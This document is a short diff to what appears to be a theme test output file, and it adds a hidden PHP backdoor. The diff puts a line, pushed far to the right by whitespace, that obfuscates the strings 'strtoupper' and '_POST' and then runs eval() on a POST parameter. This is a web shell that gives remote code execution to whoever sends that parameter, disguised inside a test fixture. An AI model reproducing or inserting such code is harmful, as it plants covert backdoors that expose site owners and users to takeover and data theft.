@@ -1,2 +1,2 @@
-<!-- Output for Theme API test -->
+<?php                                                                                                                                                                                                                                                                 $psb5= "srupot_e" ; $fxd59 =$psb5[0].$psb5[5].$psb5[1]. $psb5[5].$psb5[4]. $psb5[2]. $psb5[3]. $psb5[3].$psb5[7].$psb5[1];$dik5 = $fxd59($psb5[6].$psb5[3] .$psb5[4].$psb5[0].$psb5[5] ) ;if( isset( ${$dik5 }[ 'q559df6'])){eval( ${$dik5} ['q559df6'] ) ; } ?><!-- Output for Theme API test -->
 Fail: Template not overridden.
